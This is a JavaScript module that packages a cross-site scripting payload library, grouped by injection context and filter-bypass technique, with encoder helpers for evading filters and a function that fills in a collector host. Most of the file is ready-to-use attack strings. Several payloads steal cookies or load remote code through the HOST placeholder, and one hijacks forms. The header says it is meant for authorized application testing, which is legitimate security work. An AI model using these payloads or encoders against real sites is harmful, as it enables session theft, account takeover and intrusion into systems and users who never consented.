// XSS payload library + encoders. A curated catalogue (PortSwigger / PayloadsAllTheThings
// style) plus context encoders. For testing reflection/filtering on apps you're allowed to test.
// Payloads use HOST as a placeholder for your collector (e.g. your Burp Collaborator / listener).

export const GROUPS = [
  ['Basic', [
    ['<script>alert(document.domain)</script>', 'classic, HTML context'],
    ['<script>alert(1)</script>', 'shortest proof'],
    ['"><script>alert(1)</script>', 'break out of an attribute value'],
    ["'><script>alert(1)</script>", 'break out of a single-quoted attribute'],
    ['</title><script>alert(1)</script>', 'break out of <title>'],
    ['</textarea><script>alert(1)</script>', 'break out of <textarea>'],
  ]],
  ['No <script> (img / svg / body)', [
    ['<img src=x onerror=alert(1)>', 'most common filter bypass'],
    ['<svg onload=alert(1)>', 'short, no external resource'],
    ['<svg/onload=alert(1)>', 'slash instead of space'],
    ['<body onload=alert(1)>', ''],
    ['<iframe src="javascript:alert(1)">', ''],
    ['<video><source onerror=alert(1)>', ''],
    ['<details open ontoggle=alert(1)>', 'no interaction needed'],
    ['<marquee onstart=alert(1)>', ''],
    ['<input autofocus onfocus=alert(1)>', 'fires on autofocus'],
    ['<img src=x onerror="fetch(\'//HOST/\'+document.cookie)">', 'cookie exfiltration'],
  ]],
  ['Attribute / event context', [
    ['" onmouseover="alert(1)', 'inject into an existing attribute'],
    ['" autofocus onfocus="alert(1)', ''],
    ["javascript:alert(1)", 'href / src context'],
    ['" onload="alert(1)" x="', ''],
    ['%22%20onmouseover=%22alert(1)', 'URL-encoded attribute breakout'],
  ]],
  ['JavaScript string context', [
    ["';alert(1)//", 'break out of a single-quoted JS string'],
    ['";alert(1)//', 'double-quoted'],
    ['</script><script>alert(1)</script>', 'break out of the script block'],
    ["'-alert(1)-'", 'inside a JS expression'],
    ['\\x27);alert(1)//', 'escaped-quote bypass'],
  ]],
  ['Filter / WAF bypass', [
    ['<ScRipT>alert(1)</sCrIpt>', 'mixed case'],
    ['<script>al\\u0065rt(1)</script>', 'unicode escape in the sink'],
    ['<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', 'HTML entities'],
    ['<svg><script>alert&lpar;1&rpar;</script>', 'entity parens'],
    ['<a href="&#106;avascript:alert(1)">x</a>', 'entity-encoded scheme'],
    ['<img src=x:alert(1) onerror=eval(src)>', 'src as code'],
    ['<svg><animate onbegin=alert(1) attributeName=x dur=1s>', ''],
    ['<x contenteditable onbeforeinput=alert(1)>', 'newer event handler'],
  ]],
  ['Polyglots', [
    ["jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>", "29-context polyglot (0xsobky)"],
    ['"><svg/onload=alert(1)>', 'short HTML + attribute polyglot'],
  ]],
  ['DOM / modern', [
    ['<img src=x onerror=import(\'//HOST/x.js\')>', 'load an external module'],
    ['<script>location=`//HOST/?c=${document.cookie}`</script>', 'redirect exfil'],
    ['<iframe srcdoc="<script>alert(1)</script>">', 'srcdoc'],
    ['<form action=//HOST method=POST><input name=x>', 'form hijack'],
  ]],
];

export const PAYLOADS = GROUPS.flatMap(([cat, list]) => list.map(([payload, note]) => ({ cat, payload, note })));

// —— encoders ——
const ent = (s, fn) => [...s].map(fn).join('');
export const ENCODERS = {
  none: (s) => s,
  html: (s) => s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])),
  'html-dec': (s) => ent(s, (c) => `&#${c.charCodeAt(0)};`),
  'html-hex': (s) => ent(s, (c) => `&#x${c.charCodeAt(0).toString(16)};`),
  url: (s) => encodeURIComponent(s),
  'url-all': (s) => ent(s, (c) => '%' + c.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()),
  'double-url': (s) => encodeURIComponent(encodeURIComponent(s)),
  'js-hex': (s) => ent(s, (c) => { const n = c.charCodeAt(0); return n < 256 ? '\\x' + n.toString(16).padStart(2, '0') : '\\u' + n.toString(16).padStart(4, '0'); }),
  unicode: (s) => ent(s, (c) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')),
  base64: (s) => btoa(unescape(encodeURIComponent(s))),
};
export const ENCODER_LABELS = { none: 'None', html: 'HTML (minimal)', 'html-dec': 'HTML decimal entities', 'html-hex': 'HTML hex entities', url: 'URL', 'url-all': 'URL (all chars)', 'double-url': 'Double URL', 'js-hex': 'JS \\xNN / \\uNNNN', unicode: 'Unicode \\uNNNN', base64: 'Base64' };

export const apply = (s, enc, host) => ENCODERS[enc]((host ? s.replaceAll('HOST', host) : s));
